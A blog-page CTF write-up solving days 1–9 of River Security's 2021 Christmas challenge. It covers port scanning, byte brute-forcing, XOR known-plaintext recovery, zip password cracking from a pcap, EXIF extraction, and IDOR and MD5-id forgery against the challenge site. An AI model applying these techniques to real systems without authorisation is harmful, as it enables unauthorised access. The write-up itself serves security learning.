<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <link rel="icon" href="../favicon.png" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta http-equiv="content-security-policy" content=""><title>River Security Xmas Challenge (RSXC2021)</title><meta property="og:title" content="River Security Xmas Challenge (RSXC2021)" data-svelte="svelte-15w3rt">
	<link href="/_app/immutable/assets/__layout-8983cb90.css" rel="stylesheet">
	<link href="/_app/immutable/assets/layout-1c8f6cd0.css" rel="stylesheet">
	<link rel="modulepreload" href="/_app/immutable/start-970782a7.js">
	<link rel="modulepreload" href="/_app/immutable/chunks/index-2b5eadba.js">
	<link rel="modulepreload" href="/_app/immutable/chunks/index-af51f98b.js">
	<link rel="modulepreload" href="/_app/immutable/pages/__layout.svelte-e4fb7ac9.js">
	<link rel="modulepreload" href="/_app/immutable/chunks/stores-f88c56d4.js">
	<link rel="modulepreload" href="/_app/immutable/chunks/index-94d4402f.js">
	<link rel="modulepreload" href="/_app/immutable/pages/blog/rsxc.md-1e511214.js">
	<link rel="modulepreload" href="/_app/immutable/chunks/layout-4590ce8c.js">
	<link rel="modulepreload" href="/_app/immutable/chunks/utils-e126d158.js">
  </head>
  <body>
    <div>


<header class="show svelte-fvi1vf"><div class="corner svelte-fvi1vf"><a sveltekit:prefetch href="/" class="svelte-fvi1vf"><img src="/_app/immutable/assets/logo-30cfdbde.png" alt="Logo" class="svelte-fvi1vf"></a></div>

  <nav class="svelte-fvi1vf"><ul class="svelte-fvi1vf"><li class="svelte-fvi1vf"><a sveltekit:prefetch href="/" class="svelte-fvi1vf">Home</a></li>
      <li class="svelte-fvi1vf"><a sveltekit:prefetch href="/about" class="svelte-fvi1vf">About</a></li>
      <li class="svelte-fvi1vf active"><a sveltekit:prefetch href="/blog" class="svelte-fvi1vf">Blog</a></li></ul></nav>

  <div class="corner svelte-fvi1vf"></div>
</header>



<main class="svelte-2wbpbt">

<section class="content"><div><h1>River Security Xmas Challenge (RSXC2021)</h1>

  <p>December 26, 2021
    ·
    <span>Category: <a href="/blog/category/writeup">writeup</a></span></p>

  <p>Tags:
    <span><a href="/blog/tags/rsxc">rsxc</a>
      </span><span><a href="/blog/tags/ctf">ctf</a>
      </span></p></div>

<p>Here is Shirajuki’s write-up of the challenges of the company River Security’s capture the flag advent calendar for 2021, RSXC.</p>
<h2 id="day-1-the-search"><a href="#day-1-the-search">[DAY 1] The search</a></h2>
<h3 id="challenge"><a href="#challenge">Challenge</a></h3>
<blockquote><p>Welcome to the River Security XMas Challenge (RSXC)! RSXC operates with the following flag format for most challenges <code>RSXC{flag}</code>. If another flag format is used, the challenge text will mention this.</p>
<p>In this first challenge we have managed to forget which port we are listening on. Could you please find the port listening for traffic? We know it’s in the range 30 000-31 000.</p></blockquote>
<h3 id="solution"><a href="#solution">Solution</a></h3>
<p>We have been told that there is an open port in the range 30000 - 31000 on the traffic of the domain. Using the network exploration tool and security, or port scanner tool, nmap. We easily find the port:</p>
<pre class="language-shell"><!-- HTML_TAG_START --><code class="language-shell">juki@izone:~$ nmap rsxc.no -p30000-31000 -Pn
Starting Nmap <span class="token number">7.70</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2021</span>-12-15 <span class="token number">23</span>:27 CET
Nmap scan report <span class="token keyword">for</span> rsxc.no <span class="token punctuation">(</span><span class="token number">134.209</span>.137.128<span class="token punctuation">)</span>
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.036s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">1000</span> closed ports
PORT      STATE SERVICE
<span class="token number">30780</span>/tcp <span class="token function">open</span>  unknown

Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">1.76</span> seconds
juki@izone:~$ <span class="token function">nc</span> rsxc.no <span class="token number">30780</span>
RSXC<span class="token punctuation">&#123;</span>Congrats<span class="token operator">!</span>You_found_the_secret_port_I_was_trying_to_hide<span class="token operator">!</span><span class="token punctuation">&#125;</span></code><!-- HTML_TAG_END --></pre>
<p>The flag is: <code>RSXC{Congrats!You_found_the_secret_port_I_was_trying_to_hide!}</code></p>
<h2 id="day-2-a-magic-word"><a href="#day-2-a-magic-word">[DAY 2] A magic word</a></h2>
<h3 id="challenge-1"><a href="#challenge-1">Challenge</a></h3>
<blockquote><p>We have found a magical port that is listening on port 20002, maybe you can find todays flag there?</p>
<p>rsxc.no:20002</p></blockquote>
<h3 id="solution-1"><a href="#solution-1">Solution</a></h3>
<p>We know that there is an open port at 20002, connecting to it using the tool <code>netcat</code>, we see that it takes in an input and outputs <code>&quot;That is not the byte I want!&quot;</code> whenever the user writes in the wrong input.</p>
<pre class="language-shell"><!-- HTML_TAG_START --><code class="language-shell">juki@izone:~$ <span class="token function">nc</span> rsxc.no <span class="token number">20002</span>
aaaa
That is not the byte I want<span class="token operator">!</span></code><!-- HTML_TAG_END --></pre>
<p>From the message and the title of the challenge, I guessed that only by inputting the correct letter or byte, will the flag be given. I hacked together a quick Python script with the help of pwntools to send in all the bytes from 0 to 256:</p>
<pre class="language-python"><!-- HTML_TAG_START --><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token comment">#context.log_level = "debug"</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"error"</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"rsxc.no"</span><span class="token punctuation">,</span> <span class="token number">20002</span><span class="token punctuation">)</span>
    sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
    flag <span class="token operator">=</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>timeout<span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token string">b"RSXC&#123;"</span> <span class="token keyword">in</span> flag<span class="token punctuation">:</span> <span class="token comment"># flag at ascii code 212</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
        <span class="token keyword">break</span></code><!-- HTML_TAG_END --></pre>
<p>The flag is <code>RSXC{You_found_the_magic_byte_I_wanted_Good_job!}</code></p>
<h2 id="day-3-what-does-this-mean"><a href="#day-3-what-does-this-mean">[DAY 3] What does this mean?</a></h2>
<h3 id="challenge-2"><a href="#challenge-2">Challenge</a></h3>
<blockquote><p>When looking for the prizes to this challenge we came across some text we can’t understand, can you help us figure out what it means?
<a href="https://rsxc.no/274d11760e75cfd2c5f6a8a1198a6c19ddee702a8b7e26102e8e48f0212cc278/03-challenge.txt" rel="noopener" class="text-link" target="_blank">https://rsxc.no/274d11760e75cfd2c5f6a8a1198a6c19ddee702a8b7e26102e8e48f0212cc278/03-challenge.txt</a></p></blockquote>
<h3 id="solution-2"><a href="#solution-2">Solution</a></h3>
<pre class="language-undefined"><!-- HTML_TAG_START --><code class="language-undefined">// 03-challenge.txt
ZlhTWk5KQTV6d3JuVzNpQnFyeGl5cXNkSEdBelZWVkdOMVVXRkQzVG5XQjhSSlBxU3VVQjNvVGZlTjJmdll0ZnVDazRyRzk0SzRYSzUxdzlwZktTY1pqMTdBeXNKa0ZWZVpGdXV6Snh1YmF0OWRORWJBbVNGU0RBeDhvdkZGTjh5VG44WnhKUjU2THZ6NFU1dVloeTExaEVEZzRlSGlTS29EWnJvNTVWTng3NUN4RWJwRnRnOUdDZVR2dEtCVldKajVWOFRwOFIzUXI4WmhRVEhON3BGQXM4NWdoMXNzNUxXcXplUW5kTVdnenliaHgxRFU0RlczNXBTU2drdkVtYjc2dnE2TDlzeERYQXpTcXoxNzFOMkZmZ1M4aGdmZFY4VmpnQWlIc1I3ZjU2ZjdBc2h2cFZwdmZmOVd0VUZnSjJFRVBXeENCeFVHOXRQVFpjYTlFUXczaFJUd1M0RlZlTE1TUHNCdXpKWTdxU043cEs5bTlKNWs3cTRNaWI2Ym1Lem9uYXk1bUVNeXJtYVNVNFVnWm9VeG9KdkRrVkhS</code><!-- HTML_TAG_END --></pre>
<p>We are given a text file with the content of something looking like a base64 string. Knowing this, I began to believe that it could easily be solved using an online decryption tool like Cyberchef. Playing with the different operations in cyberchef and the use of the “Magic” tool does finally give us the flag: <a href="https://gchq.github.io/CyberChef/#recipe=From_Base64(%27A-Za-z0-9%2B/%3D%27,true)From_Base58(%27rpshnaf39wBUDNEGHJKLM4PQRST7VWXYZ2bcdeCg65jkm8oFqi1tuvAxyz%27,false)Bzip2_Decompress(false)From_Base85(%27!-u%27)From_Morse_Code(%27Space%27,%27Line%20feed%27)From_Hex(%27Auto%27)From_Base32(%27A-Z2-7%3D%27,false)" rel="noopener" class="text-link" target="_blank">https://gchq.github.io/CyberChef/#recipe=From_Base64(‘A-Za-z0-9%2B/%3D’,true)From_Base58(‘rpshnaf39wBUDNEGHJKLM4PQRST7VWXYZ2bcdeCg65jkm8oFqi1tuvAxyz’,false)Bzip2_Decompress(false)From_Base85(‘!-u’)From_Morse_Code(‘Space’,‘Line%20feed’)From_Hex(‘Auto’)From_Base32(‘A-Z2-7%3D’,false)</a></p>
<p>The flag is <code>RSXC{I_hope_you_used_cyber_chef_it_does_make_it_alot_easier}</code>.</p>
<h2 id="day-4-4-bytes-of-xor"><a href="#day-4-4-bytes-of-xor">[DAY 4] 4 Bytes of XOR</a></h2>
<h3 id="challenge-3"><a href="#challenge-3">Challenge</a></h3>
<blockquote><p>The flag of the day can be found by xor’ing our text with 4 bytes.
<a href="https://rsxc.no/e26113731cc5514c745bd8f4bdfd43a25b3a9e2286f48fba887910f16e5ad049/04-challenge.txt" rel="noopener" class="text-link" target="_blank">https://rsxc.no/e26113731cc5514c745bd8f4bdfd43a25b3a9e2286f48fba887910f16e5ad049/04-challenge.txt</a></p></blockquote>
<h3 id="solution-3"><a href="#solution-3">Solution</a></h3>
<p>We are given a text file containing the encoded flag of the day. From the challenge description we know that it is encoded with XOR and the key is of 4 bytes. Knowing that a XOR cipher is insecure if the key used is smaller in length than the plaintext (ie. a repeating key). Another approach is to also bruteforce the key as it is also just 4 bytes. But as the flag format is known <code>RSXC{</code>, we can essentially perform a simple known-plaintext attack, and find the key first then solve the challenge by further decoding the flag. A quick python script for the solution looks like this:</p>
<pre class="language-python"><!-- HTML_TAG_START --><code class="language-python"><span class="token comment"># Turn each char of flag into decimals for easier calculation (xoring)</span>
flag <span class="token operator">=</span> <span class="token string">"0xda0x960x0c0x960xf30x880x3b0xa60xfc0x9a0x230xba0xfd0xa90x300x8a0xfb0xa40x2d0x8a0xd00x8a0x060x8a0xe10xb60x3a0xf20xfc0x9a0x200xbd0xe90xb10x0b0xa00xfb0xa00x320xa00xe40x9a0x350xbb0xf10xa80x3b0xa70xed0xb8"</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span>
flag <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
<span class="token comment"># Find key</span>
key <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
key<span class="token punctuation">.</span>append<span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">^</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">"R"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
key<span class="token punctuation">.</span>append<span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">^</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">"S"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
key<span class="token punctuation">.</span>append<span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">^</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">"X"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
key<span class="token punctuation">.</span>append<span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">^</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">"C"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
key <span class="token operator">=</span> key<span class="token operator">*</span><span class="token number">20</span> <span class="token comment"># Repeat the key many times</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span>
<span class="token comment"># XOR</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">chr</span><span class="token punctuation">(</span>x<span class="token operator">^</span>y<span class="token punctuation">)</span> <span class="token keyword">for</span> x<span class="token punctuation">,</span>y <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>flag<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code><!-- HTML_TAG_END --></pre>
<p>The flag is <code>RSXC{Most_would_say_XOR_isn&#39;t_that_useful_anymore}</code></p>
<h2 id="day-5-plain-discussion"><a href="#day-5-plain-discussion">[DAY 5] Plain discussion</a></h2>
<h3 id="challenge-4"><a href="#challenge-4">Challenge</a></h3>
<blockquote><p>A spy was listening in on some of our discussion about todays challenge. Can you figure out what he found?
<a href="https://rsxc.no/a28ac32e489c7714b63e26df0f8f0c71d0460e97b898299d32b30192f8f017af/05-challenge.pcap" rel="noopener" class="text-link" target="_blank">https://rsxc.no/a28ac32e489c7714b63e26df0f8f0c71d0460e97b898299d32b30192f8f017af/05-challenge.pcap</a></p></blockquote>
<h3 id="solution-4"><a href="#solution-4">Solution</a></h3>
<p>We are given a pcap network traffic capture file containing unencrypted text messages, and as what one would normally do in a network traffic challenge is to begin looking at it and analyzing the different packets found in the .pcap file. Before doing that with wireshark however, I began by stringing the flag thinking that it might be a simple fast solution to the challenge, but there was nothing to be found at first.</p>
<pre class="language-shell"><!-- HTML_TAG_START --><code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021$ strings 05-challenge.pcap <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"RSXC"</span></code><!-- HTML_TAG_END --></pre>
<p>Following that I stringed for <code>flag</code> which did give me enough result for solving the challenge, thus skipping the potential usage of wireshark completely.</p>
<pre class="language-shell"><!-- HTML_TAG_START --><code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021$ strings 05-challenge.pcap <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"flag"</span>
PRIVMSG <span class="token comment">#channel :Hey, got any suggestions for the challenge? Any way we can make it harder to get the flag?</span>
PRIVMSG <span class="token comment">#channel :Hey, got any suggestions for the challenge? Any way we can make it harder to get the flag?</span>
PRIVMSG <span class="token comment">#channel :Hey, got any suggestions for the challenge? Any way we can make it harder to get the flag?</span>
<span class="token number">4</span>*<span class="token comment">#J?V:simen!ubuntu@172.17.0.1 PRIVMSG #channel :Hey, got any suggestions for the challenge? Any way we can make it harder to get the flag?</span>
<span class="token number">4</span>*<span class="token comment">#J?V:simen!ubuntu@172.17.0.1 PRIVMSG #channel :Hey, got any suggestions for the challenge? Any way we can make it harder to get the flag?</span>
:simen<span class="token operator">!</span>ubuntu@172.17.0.1 PRIVMSG <span class="token comment">#channel :Hey, got any suggestions for the challenge? Any way we can make it harder to get the flag?</span>
jPRIVMSG <span class="token comment">#channel :What about encrypting a zip file containing the flag? Let's say a 10 digit long number above 9 954 000 000 as the password?</span>
<span class="token number">4</span>*PRIVMSG <span class="token comment">#channel :What about encrypting a zip file containing the flag? Let's say a 10 digit long number above 9 954 000 000 as the password?</span>
<span class="token number">4</span>*PRIVMSG <span class="token comment">#channel :What about encrypting a zip file containing the flag? Let's say a 10 digit long number above 9 954 000 000 as the password?</span>
:chris<span class="token operator">!</span>ubuntu@172.17.0.1 PRIVMSG <span class="token comment">#channel :What about encrypting a zip file containing the flag? Let's say a 10 digit long number above 9 954 000 000 as the password?</span>
:chris<span class="token operator">!</span>ubuntu@172.17.0.1 PRIVMSG <span class="token comment">#channel :What about encrypting a zip file containing the flag? Let's say a 10 digit long number above 9 954 000 000 as the password?</span>
x<span class="token operator">&amp;</span>:chris<span class="token operator">!</span>ubuntu@172.17.0.1 PRIVMSG <span class="token comment">#channel :What about encrypting a zip file containing the flag? Let's say a 10 digit long number above 9 954 000 000 as the password?</span>
STOR ./flag.zip
	STOR ./flag.zip
	STOR ./flag.zip
flag.txtUT
flag.txtUT
flag.txtUT
flag.txtUT</code><!-- HTML_TAG_END --></pre>
<p>From the output above and the hint from the messages, I could guess that this challenge could be solved by extracting the password protected flag.zip file and then bruteforcing it using fcrackzip with the 10 digit long number constraints. Quite similar to some of the challenges I have done prior to this. Knowing the solution to this challenge, solving it and bruteforcing the zip file has become as trivial as running the following commands:</p>
<pre class="language-shell"><!-- HTML_TAG_START --><code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021$ binwalk -e 05-challenge.pcap

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
<span class="token number">0</span>             0x0             Libpcap capture file, little-endian, version <span class="token number">2.4</span>, Linux <span class="token string">"cooked"</span>, snaplen: <span class="token number">262144</span>
<span class="token number">44141</span>         0xAC6D          Zip archive data, encrypted at least v2.0 to extract, compressed size: <span class="token number">67</span>, uncompressed size: <span class="token number">56</span>, name: flag.txt
<span class="token number">44368</span>         0xAD50          End of Zip archive, footer length: <span class="token number">22</span>
<span class="token number">44474</span>         0xADBA          Zip archive data, encrypted at least v2.0 to extract, compressed size: <span class="token number">67</span>, uncompressed size: <span class="token number">56</span>, name: flag.txt
<span class="token number">44701</span>         0xAE9D          End of Zip archive, footer length: <span class="token number">22</span>

juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token builtin class-name">cd</span> _05-challenge.pcap.extracted/
juki@izone:~/Desktop/ctf/rsxc2021/_05-challenge.pcap.extracted$ <span class="token function">ls</span>
AC6D.zip  ADBA.zip  flag.txt
juki@izone:~/Desktop/ctf/rsxc2021/_05-challenge.pcap.extracted$ <span class="token function">unzip</span> -v ADBA.zip
Archive:  ADBA.zip
 Length   Method    Size  Cmpr    Date    Time   CRC-32   Name
--------  ------  ------- ---- ---------- ----- --------  ----
      <span class="token number">56</span>  Defl:N       <span class="token number">55</span>   <span class="token number">2</span>% <span class="token number">2021</span>-11-10 <span class="token number">16</span>:31 79fcc455  flag.txt
--------          -------  ---                            -------
      <span class="token number">56</span>               <span class="token number">55</span>   <span class="token number">2</span>%                            <span class="token number">1</span> <span class="token function">file</span>
juki@izone:~/Desktop/ctf/rsxc2021/_05-challenge.pcap.extracted$ fcrackzip -u --length <span class="token number">10</span> -p <span class="token number">9954000000</span> --charset <span class="token number">1</span> ADBA.zip -v
found <span class="token function">file</span> <span class="token string">'flag.txt'</span>, <span class="token punctuation">(</span>size cp/uc     <span class="token number">67</span>/    <span class="token number">56</span>, flags <span class="token number">9</span>, chk 3be9<span class="token punctuation">)</span>


PASSWORD FOUND<span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span>: pw <span class="token operator">==</span> <span class="token number">9954359864</span>
juki@izone:~/Desktop/ctf/rsxc2021/_05-challenge.pcap.extracted$ <span class="token function">unzip</span> ADBA.zip
Archive:  ADBA.zip
<span class="token punctuation">[</span>ADBA.zip<span class="token punctuation">]</span> flag.txt password:
replace flag.txt? <span class="token punctuation">[</span>y<span class="token punctuation">]</span>es, <span class="token punctuation">[</span>n<span class="token punctuation">]</span>o, <span class="token punctuation">[</span>A<span class="token punctuation">]</span>ll, <span class="token punctuation">[</span>N<span class="token punctuation">]</span>one, <span class="token punctuation">[</span>r<span class="token punctuation">]</span>ename: y
  inflating: flag.txt
juki@izone:~/Desktop/ctf/rsxc2021/_05-challenge.pcap.extracted$ <span class="token function">cat</span> flag.txt
RSXC<span class="token punctuation">&#123;</span>Good_job_analyzing_the_pcap_did_you_see_the_hint?<span class="token punctuation">&#125;</span></code><!-- HTML_TAG_END --></pre>
<p>The flag is <code>RSXC{Good_job_analyzing_the_pcap_did_you_see_the_hint?}</code></p>
<h2 id="day-6-the-indecipherable-cipher"><a href="#day-6-the-indecipherable-cipher">[DAY 6] The indecipherable cipher</a></h2>
<h3 id="challenge-5"><a href="#challenge-5">Challenge</a></h3>
<blockquote><p>We recently did some research on some old ciphers, and found one that supposedly was indecipherable, but maybe you can prove them wrong?
<a href="https://rsxc.no/af00ef8611422bdcd1606f51a55ccbccf16c6ac56a1bea01e4e725dae506aaf0/06-challenge.txt" rel="noopener" class="text-link" target="_blank">https://rsxc.no/af00ef8611422bdcd1606f51a55ccbccf16c6ac56a1bea01e4e725dae506aaf0/06-challenge.txt</a></p></blockquote>
<h3 id="solution-5"><a href="#solution-5">Solution</a></h3>
<p>As this is an old cipher challenge, I could guess that the cipher will for most part be insecure and that there is also a high change that there already exist online decoders out there in the Internet for that specific cipher. Knowing this I began by identifying the cipher using <a href="https://www.dcode.fr/cipher-identifier" rel="noopener" class="text-link" target="_blank">dcode’s cipher identification tool</a>. The result from that tool gave me the cipher <code>vigènere cipher</code> as the highest probability. Following that I used the same site for decoding vigenere ciphertexts and found the flag on key <code>YMZHG</code>:
<img src="https://i.imgur.com/CpPvW5u.png" alt="dcode decryption"></p>
<p>The flag is <code>RSXC{isthisnotjustafancycaesarcipher}</code></p>
<h2 id="day-7-this-is-quite-meta"><a href="#day-7-this-is-quite-meta">[DAY 7] This is quite meta</a></h2>
<h3 id="challenge-6"><a href="#challenge-6">Challenge</a></h3>
<blockquote><p>We found this picture that seemed to contain the flag, but it seems like it has been cropped, are you able to help us retrieve the flag?
<a href="https://rsxc.no/6c9161113dadfbb06d6865f9db5499bd701067c9d69c2452894a8fcf697d21d9/07-challenge.jpg" rel="noopener" class="text-link" target="_blank">https://rsxc.no/6c9161113dadfbb06d6865f9db5499bd701067c9d69c2452894a8fcf697d21d9/07-challenge.jpg</a></p></blockquote>
<h3 id="solution-6"><a href="#solution-6">Solution</a></h3>
<p>We are given an image file that seems to have some parts of it missing. I guessed from the title that it has something to do with the metadata of the image. Having this in mind, I began to look at it using exiftools:</p>
<pre class="language-shell"><!-- HTML_TAG_START --><code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021$ exiftool 07-challenge.jpg
ExifTool Version Number         <span class="token builtin class-name">:</span> <span class="token number">11.16</span>
File Name                       <span class="token builtin class-name">:</span> 07-challenge.jpg
Directory                       <span class="token builtin class-name">:</span> <span class="token builtin class-name">.</span>
File Size                       <span class="token builtin class-name">:</span> <span class="token number">9.0</span> kB
File Modification Date/Time     <span class="token builtin class-name">:</span> <span class="token number">2021</span>:11:25 <span class="token number">22</span>:43:28+01:00
File Access Date/Time           <span class="token builtin class-name">:</span> <span class="token number">2021</span>:12:16 <span class="token number">12</span>:45:32+01:00
File Inode Change Date/Time     <span class="token builtin class-name">:</span> <span class="token number">2021</span>:12:16 <span class="token number">12</span>:45:22+01:00
File Permissions                <span class="token builtin class-name">:</span> rw-r--r--
File Type                       <span class="token builtin class-name">:</span> JPEG
File Type Extension             <span class="token builtin class-name">:</span> jpg
MIME Type                       <span class="token builtin class-name">:</span> image/jpeg
JFIF Version                    <span class="token builtin class-name">:</span> <span class="token number">1.01</span>
Comment                         <span class="token builtin class-name">:</span> CREATOR: gd-jpeg v1.0 <span class="token punctuation">(</span>using IJG JPEG v80<span class="token punctuation">)</span>, quality <span class="token operator">=</span> <span class="token number">75</span>.
Exif Byte Order                 <span class="token builtin class-name">:</span> Big-endian <span class="token punctuation">(</span>Motorola, MM<span class="token punctuation">)</span>
X Resolution                    <span class="token builtin class-name">:</span> <span class="token number">96</span>
Y Resolution                    <span class="token builtin class-name">:</span> <span class="token number">96</span>
Resolution Unit                 <span class="token builtin class-name">:</span> inches
Y Cb Cr Positioning             <span class="token builtin class-name">:</span> Centered
Thumbnail Offset                <span class="token builtin class-name">:</span> <span class="token number">199</span>
Thumbnail Length                <span class="token builtin class-name">:</span> <span class="token number">2265</span>
Image Width                     <span class="token builtin class-name">:</span> <span class="token number">798</span>
Image Height                    <span class="token builtin class-name">:</span> <span class="token number">69</span>
Encoding Process                <span class="token builtin class-name">:</span> Baseline DCT, Huffman coding
Bits Per Sample                 <span class="token builtin class-name">:</span> <span class="token number">8</span>
Color Components                <span class="token builtin class-name">:</span> <span class="token number">1</span>
Image Size                      <span class="token builtin class-name">:</span> 798x69
Megapixels                      <span class="token builtin class-name">:</span> <span class="token number">0.055</span>
Thumbnail Image                 <span class="token builtin class-name">:</span> <span class="token punctuation">(</span>Binary data <span class="token number">2265</span> bytes, use -b option to extract<span class="token punctuation">)</span></code><!-- HTML_TAG_END --></pre>
<p>Looking at the output, there seems to be some some binary data at the metadata “Thumbnail Image”. Using <a href="https://www.dcode.fr/exif-thumbnail" rel="noopener" class="text-link" target="_blank">dcode’s EXIF Thumbnail Extractor tool</a> I try to extract the thumbnail image hoping that the saved thumbnail of the image is of the uncropped and full image, thus also finding the whole flag:
<img src="https://i.imgur.com/b50clg5.png" alt="dcode decryption"></p>
<p>The flag is: <code>RSXC{Sometimes_metadata_hides_stuff}</code></p>
<h2 id="day-8-the-reference"><a href="#day-8-the-reference">[DAY 8] The reference</a></h2>
<h3 id="challenge-7"><a href="#challenge-7">Challenge</a></h3>
<blockquote><p>I just created a new note saving application, there is still some improvements that can be made but I still decided to show it to you!
<a href="http://rsxc.no:20008/" rel="noopener" class="text-link" target="_blank">http://rsxc.no:20008</a></p></blockquote>
<h3 id="solution-7"><a href="#solution-7">Solution</a></h3>
<p>We are given a link to a page with different notes saved. Out of all the notes we see that, Note 2, Note 3 and Note 4 are available for us. Opening any of the note directs us to a php site with the GET request <code>id</code> of that note number: <code>http://rsxc.no:20008/notes.php?id=2</code>. By directly changing the value of <code>id</code> and the url to <code>http://rsxc.no:20008/notes.php?id=0</code> we receive the flag.</p>
<p>The flag is: <code>RSXC{Remember_to_secure_your_direct_object_references}</code></p>
<h2 id="day-9-the-reference-2"><a href="#day-9-the-reference-2">[DAY 9] The reference 2</a></h2>
<h3 id="challenge-8"><a href="#challenge-8">Challenge</a></h3>
<blockquote><p>I see that someone managed to read my personal notes yesterday, so I have improved the security! Good luck!
<a href="http://rsxc.no:20009/" rel="noopener" class="text-link" target="_blank">http://rsxc.no:20009</a></p></blockquote>
<h3 id="solution-8"><a href="#solution-8">Solution</a></h3>
<p>Navigating to the site shows something that looks quite similar to the last challenge, but with a more secured referencing as it is encoded in some way. Reading the different notes available to us gave us the keywords and hints of: <code>RFC 1321</code> and<code>MD5</code>, thus hinting to the used algorithm the note ids are encoded/hashed with. To confirm this, I checked the different id from the available notes on crackstation, and it is indeed true:
<img src="https://i.imgur.com/OqEYN2c.png" alt="crackstation hash lookup"></p>
<p>Knowing the naming convention and the hash algorithm used for the note id, I could easily craft my own for “note0”:</p>
<pre class="language-shell"><!-- HTML_TAG_START --><code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token builtin class-name">echo</span> -n note0 <span class="token operator">|</span> md5sum
65b29a77142a5c237d7b21c005b72157  -</code><!-- HTML_TAG_END --></pre>
<p>Navigating to the note with that id (<a href="http://rsxc.no:20009/notes.php?id=65b29a77142a5c237d7b21c005b72157" rel="noopener" class="text-link" target="_blank">http://rsxc.no:20009/notes.php?id=65b29a77142a5c237d7b21c005b72157</a>) did however not give us the flag directly, and instead tells us that the note with the flag has the id of the md5 hash of the word <code>flag</code>. Doing the same steps as above and navigating to the note using this new note id gives us the flag:</p>
<pre class="language-shell"><!-- HTML_TAG_START --><code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token builtin class-name">echo</span> -n flag <span class="token operator">|</span> md5sum
327a6c4304ad5938eaf0efb6cc3e53dc  -
juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token function">curl</span> -s http://rsxc.no:20009/notes.php?id<span class="token operator">=</span>327a6c4304ad5938eaf0efb6cc3e53dc <span class="token operator">|</span> <span class="token function">grep</span> -Eo <span class="token string">"RSXC&#123;.*&#125;"</span>
RSXC<span class="token punctuation">&#123;</span>MD5_should_not_be_used_for_security.Especially_not_with_known_plaintext<span class="token punctuation">&#125;</span></code><!-- HTML_TAG_END --></pre>
<p>The flag is: <code>RSXC{MD5_should_not_be_used_for_security.Especially_not_with_known_plaintext}</code></p>
<h2 id="day-10-lookup"><a href="#day-10-lookup">[DAY 10] Lookup</a></h2>
<h3 id="challenge-9"><a href="#challenge-9">Challenge</a></h3>
